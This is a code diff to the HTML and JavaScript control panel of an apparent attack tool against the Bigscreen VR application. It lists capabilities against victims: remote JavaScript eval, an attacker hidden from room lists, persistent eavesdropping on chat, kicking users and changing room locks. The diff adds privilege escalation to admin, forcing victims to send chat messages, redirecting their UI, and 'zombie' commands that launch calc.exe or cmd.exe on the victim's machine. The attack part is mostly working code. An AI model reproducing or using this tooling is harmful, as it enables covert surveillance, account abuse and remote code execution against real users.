@@ -25,10 +25,14 @@
                 <p class="h3 alert-heading">Features</p>
                 <ul>
                     <li>Remote <abbr title="Read–Eval–Print Loop" class="initialism">REPL</abbr> (remote Javascript <code>eval</code>) on victim's machines.</li>
+                    <li>Run program on victim's machine.</li>
                     <li>Attacker is not visible in VR room. Attacker's username is hidden from <i>Room Preview UI</i> and from <i>Room Participants UI</i>.</li>
                     <li>Victim's chat is persistently eavesdropped, even if they go to another room.</li>
-                    <li>Kick users from rooms. <i>Only admin should be able to do this.</i></li>
+                    <li>Set selected user as admin (privilege escalation).</li>
+                    <li>Kick user from room. <i>Only admin should be able to do this.</i></li>
                     <li>Change room's settings (VR locks). <i>Only admin should be able to do this.</i></li>
+                    <li>Force user to send any chat message.</li>
+                    <li>Redirect Bigscreen's<abbr title="User Interface" class="initialism">UI</abbr> to any webpage.</li>
                 </ul>
                 <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                     <span aria-hidden="true">&times;</span>
@@ -290,6 +294,10 @@ function RoomParticipant(identity, room, userId){
         '                            <input type="text" name="sendChat" class="form-control" placeholder="chat message">\n' +
         '                            <button type="submit" class="btn btn-primary">Send chat</button>\n' +
         '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_runCalc dropdown-item" type="button">Run <code>calc.exe</code></button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_runCmd dropdown-item" type="button">Run <code>cmd.exe</code></button>\n' +
         '                    </div>\n' +
         '                </div>' +
         '                </div>\n' +
@@ -331,7 +339,13 @@ function RoomParticipant(identity, room, userId){
         that.room.kickParticipant(that.userId);
     });
     cardElement.getElementsByClassName('_setAdmin')[0].addEventListener("click", function (event) {
-        sendZombieCmd(that.identity.uuid, 'setMyUserAdmin()');
+        sendZombieCmd(that.identity.uuid, 'setMyUserAdmin();');
+    });
+    cardElement.getElementsByClassName('_runCalc')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.identity.uuid, "openLink('calc');");
+    });
+    cardElement.getElementsByClassName('_runCmd')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.identity.uuid, "openLink('cmd');");
     });
     cardElement.getElementsByClassName('_sendChat')[0].addEventListener("submit", function (event) {
         event.preventDefault();
